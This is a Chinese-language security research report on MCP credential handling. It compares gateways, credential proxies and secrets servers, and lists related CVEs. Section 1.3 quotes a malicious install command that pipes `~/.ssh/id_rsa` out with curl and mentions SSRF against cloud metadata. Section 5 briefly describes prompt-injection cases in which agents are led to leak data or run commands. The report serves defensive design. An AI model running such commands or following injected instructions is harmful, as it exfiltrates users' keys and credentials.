# 分报告 C：MCP 生态如何让 Agent「用得到密钥、看不到密钥」

> 检索时间 2026-10-26。规范版本基准：MCP `2026-07-28`。标注「未证实」的为未找到一手来源。

---

## 0. 一句话结论

**MCP 把「Agent 如何间接使用密钥」的解法放在了 Server/网关一侧，而不是协议一侧。** 协议只规定「Agent 如何拿到访问 *MCP server 本身* 的 token」；至于 server 用谁的上游凭证访问 GitHub / DB / Slack，规范留给实现者——而且对本地 stdio server，规范直接建议**从环境变量取凭证**。

推论：
- 想要「凭证不出容器」，**不能让 Agent 直连原始 API 的 MCP server**，必须是 **语义化工具 + server 侧持凭证**，或 **网关/凭证代理注入**。
- 名字里带 `secrets` 的 MCP server **绝大多数是「读出明文」型，恰恰是反模式**。

---

## 1. MCP 规范层面

### 1.1 Authorization 规范（2026-07-28）硬性条款

| 项目 | 内容 | 意义 |
|---|---|---|
| 授权框架 | OAuth 2.1；MCP server 作为 OAuth 2.1 Resource Server | 只规定「谁有权调用这个 MCP server」 |
| 资源元数据 | **RFC 9728** Protected Resource Metadata；client 通过 `WWW-Authenticate` 的 `resource_metadata` 发现 AS；必须校验 `resource` 与目标 URL 匹配以防 SSRF/混淆 | 解决「去哪授权」 |
| 资源指示器 | **RFC 8707**；client 必须在授权与 token 请求中带 `resource` | **短期、用途受限 token 的规范基础** |
| 授权响应校验 | **RFC 9207** `iss`，防 Mix-Up | — |
| 客户端身份 | **CIMD**（client_id 即 HTTPS 元数据 URL）替代开放动态注册 | 供应链/钓鱼面 |
| **Token Passthrough** | **明确禁止**：「MCP servers **MUST NOT** accept any tokens that were not explicitly issued for the MCP server」 | **网关必须做 audience 校验或凭证翻译——这就是网关存在必要性的规范依据** |
| 传输差异 | **stdio transport SHOULD NOT 遵循授权规范，而应 "retrieve credentials from the environment"** | **官方规范默认把 env 传密钥当正确姿势** |
| token 生命周期 | AS 应签发短期 access token + refresh + 轮换 | 姿势 B/C 的共性 |

### 1.2 「secrets 放 env」这个反模式的官方态度

- **规范让 env 合法**：本地 stdio server 从 env 取凭证被视为常规，因为 env 不出进程边界、stdio 由单个 client 独占。
- **但只在「单租户、本机、可信 server」成立**。进入多租户/远程/第三方后，env 是灾难：
  - 任何能读进程环境的代码（依赖包、`/proc/<pid>/environ`、崩溃日志）都能拿到全量 key；
  - key 通常长期静态，泄露即永久有效，无 audience、无 TTL、无审计归因；
  - MCP client 配置（`mcp.json` / `claude_desktop_config.json`）把 env 明文落盘，正被 CVE 当攻击面（CVE-2026-32625）。
- **厂商立场统一是「应消除」**：Docker MCP Gateway README 把 "Keep secrets out of environment variables" 写进产品三大目标；1Password 有专门的本地 `.env` 校验 hook 拦截 agent 读 `.env`。

### 1.3 官方 Security Best Practices 的 10 个攻击面

1. **Confused Deputy**——静态 client_id + 允许 DCR + 第三方 AS + 无 per-client consent → 攻击者拿用户 token。**做凭证代理的网关必须实现 per-client consent**
2. **Token Passthrough**——规范禁止；泄漏面含绕过下游限流、审计失真
3. **SSRF**——恶意 server 在 PRM / AS metadata 塞 `169.254.169.254` 偷云元数据凭证。点名 Stripe **Smokescreen** 作 egress proxy
4. **State Handle Hijacking**——持有 handle ≠ 已认证
5. **Local MCP Server Compromise**——一键配置塞 `npx malicious-package && curl -d @~/.ssh/id_rsa ...`；要求安装前 consent 且完整展示命令不截断
6. **OAuth URL Validation**——`javascript:` URL + shell 打开 → XSS/RCE
7. **Mix-Up Attack**——PKCE 与 resource indicator 都挡不住，需 RFC 9207 `iss` 校验
8. **Localhost Redirect URI Impersonation**
9. **CIMD Trust Policies**
10. **Scope Minimization**——反对 wildcard scope，主张最小 scope + `WWW-Authenticate` step-up

**小结**：规范给了「Agent → MCP server」这一跳的完整 OAuth 答案，**对「MCP server → 上游 API」这一跳完全不管**。

---

## 2. MCP Gateway / Proxy：谁真的做了 credential vaulting

> 判据：**持有上游凭证并注入** 或 **代存代刷 OAuth token** 才算 vaulting。

### 2.1 真正做了凭证托管/注入的

| 项目 | 作者 | 开源/许可 | 核心机制 | 成熟度 |
|---|---|---|---|---|
| **Docker MCP Gateway** | Docker | ✅ MIT | 每 server 一容器；secrets 存 Docker Desktop 密钥库，**按 server 隔离**（名字校验防跨 server 猜测）；`--block-secrets` 默认开，前后扫参数/响应里的疑似 secret；`--log-calls` 只记参数形状不记值；不给宿主 env | 高（Desktop 4.59+） |
| **IBM ContextForge** | IBM | ✅ Apache-2.0 | MCP/A2A/REST 联邦网关；**per-gateway + per-user OAuth token，`AUTH_ENCRYPTION_SECRET` 加密落库，近过期自动 refresh**；PKCE 自动开；RFC 8707 三级 audience 校验 | 高（4.7k star） |
| **Cloudflare MCP Server Portals** | Cloudflare | ❌ SaaS | 用户先登录 portal（Access 身份），portal 用 **per-user OAuth 或 stored credentials 附加到出站请求**；Code Mode 压缩工具；DLP | 中高 |
| **Pomerium MCP Upstream OAuth** | Pomerium | ✅ Apache-2.0 | 身份感知代理同时做 MCP server 的上游 OAuth 客户端：代换 token、加密存储、自动刷新撤销，绑定已验证身份（per-user） | 中高 |
| **Zapier MCP** | Zapier | ❌ SaaS | **Zapier 持所有 app 凭证**；agent 调 action，由 Zapier 用你的 app connection 执行 | 高 |
| **Pipedream Connect** | Pipedream | 部分 | **Connect API Proxy**：agent 发请求到 proxy，proxy「automatically insert the authorization credentials in the appropriate header or URL param」 | 高（SOC2 Type 2） |
| **Metorial** | Metorial | 部分 | 托管 MCP 网关；OAuth 类 per-user 代存代刷；**只有 API key 的应用走 no-API-keys 路线：用户粘贴一次，网关长期持有** | 中 |
| **Envoy AI Gateway – MCP** | Envoy 社区 | ✅ Apache-2.0 | 多 MCP server 聚合单端点；OAuth；**上游 API key 注入** | 中（0.4） |
| **Kong AI MCP OAuth2** | Kong | 插件开源/企业版 | 作为 MCP 的 Resource Server，校验 issuer/audience/过期 | 中 |
| **Infisical Agent Vault（开源）** | Infisical | ✅ | 单二进制「凭证代理 + vault」：agent 用假值 `__anthropic_api_key__`，`HTTPS_PROXY` 走 MITM 代理，出网替换 | 中高（2.4k star） |
| **Infisical Agent Vault（商业）** | Infisical | ❌ | service / **access bundle** / **session（TTL `30m\|8h\|7d\|never`）** / forward proxy；按 service 限定 method + path prefix，违规出网前 403 | 中（preview） |

### 2.2 只是「代理/认证」而非凭证保管的（名字容易误导）

| 项目 | 实际是什么 | 关键判断 |
|---|---|---|
| **Lasso MCP Gateway** | 本地代理 + 拦截器 + 扫描器 | **只做正则「掩码」不是 vaulting**：在请求/响应两侧遮蔽 azure secret / github token / AWS key / JWT。密钥本身仍在被代理 server 的 env 里 |
| **sparfenyuk/mcp-proxy** | Streamable HTTP ↔ stdio 传输桥 | 纯传输层 |
| **TBXark/mcp-proxy** | 单 HTTP server 聚合多个 MCP server | 聚合器，上游凭证仍是 env |
| **mcp-auth-proxy** | 给 MCP server 前面加认证 | 保护**入口**，不管上游凭证 |
| **Runlayer** | 企业 MCP 网关（治理/审计/策略） | vault 能力**未证实** |
| **Klavis** | MCP 集成平台 | OAuth 托管细节**未证实** |
| **Composio** | 工具调用平台（MIT，30.7k star） | 「凭证不出现在 agent 上下文」的强保证**未证实** |
| **Arcade.dev** | Authorized Tool Calling，调用时才授权 | 有 "tool with secrets"，属正确形态但平台是 SaaS |
| **Cloudflare AI Gateway** | LLM 请求日志/缓存/限流 | **不具备 MCP 凭证保管能力**（与 MCP Portals 是两个产品） |
| **Stacklok ToolHive** | K8s 上运行/管理 MCP server（沙箱隔离） | 强在**隔离**，secrets 仍按 server 注入 |

---

## 3. Secrets-specific MCP servers：读密钥还是用密钥？

| MCP Server | 工具 | 性质 | 判断 |
|---|---|---|---|
| **HashiCorp Vault MCP**（Beta，MPL-2.0） | `vault_read`/`vault_list`/`vault_create`/`vault_update` + admin | **读取型** | README 自写：「may expose certain Vault data, including Vault secrets, to the MCP client and LLM」。定位是「让 agent 管 Vault」 |
| **Doppler MCP**（实验性） | List/Read secret values、download configs、Create/Update、activity logs；`--read-only` 可屏蔽写 | **读取型** | 官方说 experimental |
| **Infisical secrets MCP** | 列/读 secrets | **读取型** | 与 Agent Vault 是**两个不同产品** |
| **GCP Secret Manager MCP** | 社区版读 payload | **读取型** | 官方版本**未证实** |
| **AWS Secrets Manager** | **无独立 server**；awslabs/mcp 中是消费方（`--secret_arn` + AWS_PROFILE） | **用密钥（正确）** | 「server 自己取 DB 密码、agent 只发 SQL」的正面例子 |
| **Bitwarden MCP** | 社区版读条目 | **读取型** | 官方 MCP **未证实** |
| **1Password Environments MCP**（特例） | 只建/列 Environment、列变量**名字**、挂载本地 `.env` | **「用而不看」（定向设计）** | 官方原话：「The server can only see variable and Environment names, and never returns the secrets」；每 Environment 操作需在桌面 App 逐次授权 |

> **一个容易被忽略的坑**：把 Vault/Doppler 这类 server 挂给 agent，等于**把密钥库的读权限交给 LLM**。在 prompt injection 场景下，这比把单个 API key 放 env **更糟**——泄露面从「一个 key」变成「整个项目/整个 Vault」。

---

## 4. 「Injected credentials」模式：凭证永不出容器

| 实现 | 凭证在哪 | 判断 |
|---|---|---|
| **DBHub**（Bytebase，MIT，3.7k star） | 默认只 2 个工具 `execute_sql` / `search_objects`（约 1.4k tokens）；DSN 带密码**但**正确用法是 `--secret_arn` 或 Vault 动态凭证 | 语义化到位；DSN 直写密码则退化为姿势 A |
| **awslabs/*-mcp-server** | **AWS Profile 临时凭证 + `--secret_arn`**，server 自己向 Secrets Manager 取 | ✅ 教科书式：agent 不知 DB 密码，且拿的是临时凭证 |
| **GitHub MCP Server**（官方，MIT，34k star） | 本地 stdio 用 PAT（env）；**远程托管版用 OAuth** | 远程版属姿势 B；本地 PAT 版属 A（官方同时提供） |
| **Zapier MCP / Pipedream / Metorial** | 平台侧 vault | ✅ 姿势 C 托管形态 |
| **Arcade "tool with secrets"** | 平台托管 | ✅ 需信任平台 |
| **1Password Environments MCP + `.env` 挂载** | 桌面 App 持有 | ✅ 最接近「本机场景的姿势 C」 |

**铁律**：工具是**语义化**的（`query_db(sql)`、`send_email(to, body)`）→ 凭证不在 agent 可达范围；工具是**通用型**的（`http_request(url, headers)`、`read_secret(name)`、带明文 DSN 的 `execute_sql`）→ 凭证必然泄漏。**「工具颗粒度」才是 MCP 凭证安全的第一变量。**

---

## 5. MCP 安全事件（NVD 一手记录）

### 5.1 证明「配置/env 里的密钥会漏」

| CVE | 内容 |
|---|---|
| **CVE-2026-32625**（LibreChat ≤0.8.3） | MCP server URL 的 `${VAR}` 占位符在 Zod 校验时被对照 `process.env` 展开。任意登录用户建指向攻击者域名的 server，即可让服务端把 `CREDS_KEY`、`CREDS_IV`、`JWT_SECRET`、`MONGO_URI` 拼进请求 URL 外传 |
| **CVE-2026-44653**（LibreChat ≤0.8.3） | 仅 `VIEW` 权限用户经 `GET /api/mcp/servers` 拿到 `apiKey.key` 与 `oauth.client_secret` **明文**。修复建议：「never returning decrypted admin-managed secrets to non-owners」「return boolean presence indicators for secrets」 |
| **CVE-2025-34072**（Anthropic Slack MCP，已废弃） | agent 处理不可信数据时被诱导生成含敏感数据的超链接，Slack link unfurling 出站 → **零点击外泄** |

### 5.2 证明「认证/授权层会崩」

| CVE | 内容 |
|---|---|
| **CVE-2025-4143**（Cloudflare workers-oauth-provider） | **未正确校验 `redirect_uri`** |
| **CVE-2025-4144**（同上） | PKCE 实现缺陷 |
| **CVE-2025-61591**（Cursor ≤1.7） | MCP OAuth 连不可信 server 时攻击者可冒充合法 server（Mix-Up/CIMD 要解决的问题） |
| **CVE-2025-69196**（FastMCP <2.14.2） | 服务端未正确应用 client 提交的 `resource` 参数（RFC 8707 未落实） |
| **CVE-2026-53840**（OpenClaw） | streamable-http MCP 跨源重定向时转发含凭证的自定义 header |
| **CVE-2025-66454**（Arcade MCP <1.5.4） | 硬编码默认 worker secret `"dev"` 且从未校验 |

### 5.3 证明「工具本身可被攻陷」

| CVE | 内容 |
|---|---|
| **CVE-2025-6514**（mcp-remote，**CVSS 9.6**） | 连不可信 MCP server 时 `authorization_endpoint` 响应构造输入导致 **OS 命令注入 → RCE** |
| **CVE-2025-49596**（MCP Inspector） | 远程 RCE（0.0.0.0 监听 + DNS rebinding） |
| **CVE-2025-5277**（aws-mcp-server） | **prompt 注入 → 命令注入** |
| **CVE-2025-53355 / CVE-2026-47250**（mcp-server-kubernetes） | 命令注入；kubectl 参数透传 |
| **CVE-2026-54052**（n8n-mcp，**CVSS 9.6**） | 多租户 IDOR，任意 tenant 读其他 tenant 的 workflow 备份（含 API key 与 Bearer token） |

### 5.4 「Tool poisoning」的官方定性

MCP 官方没有单列 "tool poisoning" 章节，但把**工具描述与工具返回内容一律视为不可信输入**。Docker MCP Gateway 的安全模型则**明确把 "prompt injection / tool-description poisoning" 写进 out-of-scope**——即：**网关能限制写入路径（secret 归属、egress、挂载），但不能替 agent 判断「这个工具描述是不是在骗我」。**

### 5.5 结论：为什么需要网关

1. **凭证放在 client 侧配置/env → 直接被「配置解析」类 CVE 打穿**（同一产品两周内连出 CVE-2026-32625 / 44653）
2. **认证逻辑自己写 → 极大概率写错**（redirect_uri、PKCE、resource 三类缺陷在 2025–2026 反复出现，横跨 Cloudflare / Cursor / FastMCP / Dify）
3. **MCP server 可被完全攻陷**（9.6 分 RCE），因此**凭证不能与 server 同生命周期**——必须 TTL 到期、可撤销、有 audience
4. **审计归因**：token passthrough 被禁的根本原因就是审计失真；网关持凭证才能做到 per-user、per-session 归因

---

## 6. 三种凭证处理姿势对比（核心结论）

| 维度 | **A. 密钥在 MCP server 的 env** | **B. server 持 OAuth token 自动刷新** | **C. 独立凭证代理 + 短期 token** |
|---|---|---|---|
| 典型实现 | 本地 stdio + `GITHUB_PAT=ghp_...`；规范对 stdio 明文背书 | ContextForge / Pomerium / GitHub MCP 远程版 / Cloudflare Portals / Zapier OAuth | Infisical Agent Vault / Pipedream Proxy / Docker MCP Gateway / Envoy 上游 key 注入 |
| Agent 能看到 | **能**（env、配置、`ps e`、依赖包、日志、崩溃转储） | 看不到上游凭证；但 server 进程内明文存在 | **什么都看不到**：只有 TTL 有限的 session token / 假占位符 |
| 凭证寿命 | 长期静态，泄露永久有效 | refresh token 可长期；access token 短期 | **分钟~小时**，可 `30m/8h/7d`，退出即撤销 |
| 权限粒度 | 全量（PAT = 账号权限） | OAuth scope + audience（RFC 8707） | **service + HTTP method + path prefix**，可出网前 403 |
| 审计归因 | 无（所有请求同一身份） | per-user | **per-session/per-proxy**，记 method/host/path/outcome |
| 撤销能力 | 手动改 env + 重启 | 删 token 记录，下次重授 | **即时撤销，1 个 poll interval（默认 60s）生效，无需重启 agent** |
| 依赖前提 | 无 | 上游必须 OAuth（DB 密码、静态 key 不适用） | 需额外进程/网络路径；agent 须遵守 `HTTPS_PROXY`（Node 内置 fetch 需 Node 24+ 且 `NODE_USE_ENV_PROXY=1`） |
| 攻陷后爆炸半径 | **无限** | server 进程内全部上游 token | 该 agent 有权的 service，随 session 过期收敛 |
| 现实风险事件 | CVE-2026-32625/44653、CVE-2025-5277 | CVE-2025-4143/4144/61591/69196 | 风险在代理自身（Infisical 承认：proxy 状态目录持 CA 私钥、session token 明文传给 proxy，**建议 proxy 与 agent 不同机**；不是沙箱） |
| 适用场景 | 单人本机、可信 server、一次性实验 | 多租户 SaaS、上游有标准 OAuth | 生产、非 OAuth 上游、需强审计与即时撤销 |

### 关键判断

1. **A 不是「错」，是「场景不匹配」**。规范明确让 stdio server 从 env 取凭证，因为设计假设是**单用户、本机、可信**。一旦离开这个假设，A 立刻变成最高危项——CVE-2026-32625 就是活教材。
2. **B 是「当下最佳工程解」，但有天花板**：只覆盖 OAuth 类上游。ContextForge 自己承认 OAuth 配置是 per-gateway 而不能 per-tool。
3. **C 才是目标形态，且在 MCP 里有一个天然优势**：**不要求 MCP server 做任何改造**。Infisical Agent Vault 的定位语：「let AI agents use existing tools like **MCP**, CLI, SDK, API with all underlying requests automatically routed through Agent Vault」。即 **C 可以把任意 A 类 MCP server 原地升级**。
4. **不能忽视「工具颗粒度」这个独立变量**：即使上了代理，一个暴露 `http_request(url, headers)` 的 server 依然能让 agent 把 session token 花在任何地方。**语义化工具 + 窄 scope 的 session token，两者缺一不可。**
5. **「secrets MCP server」不是本议题的答案**：给 agent 挂 Vault/Doppler MCP，等于把「单个 key 泄露」升级为「密钥库读权限泄露」。

### 落地方案

```
Agent ──(语义化工具调用，无凭证)──> MCP Server ──(假占位符/无 Authorization)──> 凭证代理 ──(注入真凭证)──> 上游 API
                                        │                                        │
                                        └── 工具白名单/args schema 校验           └── service 规则：method+path + session TTL + 审计
```

- 代理选型：自建/自托管 → **Infisical Agent Vault**（开源单二进制）或 **Docker MCP Gateway**；已有 K8s/企业栈 → **ContextForge**；已在用 Cloudflare/Pomerium/Zapier/Pipedream → 直接用托管能力。
- 必须同时满足：① session TTL ≤ 8h 且 agent 退出即撤销；② 按 service 限定 method + path prefix；③ 日志记 method/host/path/outcome 但不记 body/header；④ 代理与 agent 分机部署；⑤ MCP 侧工具语义化，禁用 `http_request` / `read_secret` 这类通用出口。

---

## 附：未证实项

Runlayer 的 vault 能力细节、Klavis 的 OAuth 托管细节、Composio 的「凭证不出现在 agent 上下文」强保证、GCP Secret Manager 官方 MCP server 是否存在、Bitwarden 官方 MCP 是否存在、Cloudflare AI Gateway 是否具备 MCP 凭证托管、Infisical Agent Vault 商业版对非 OAuth 上游的覆盖范围。
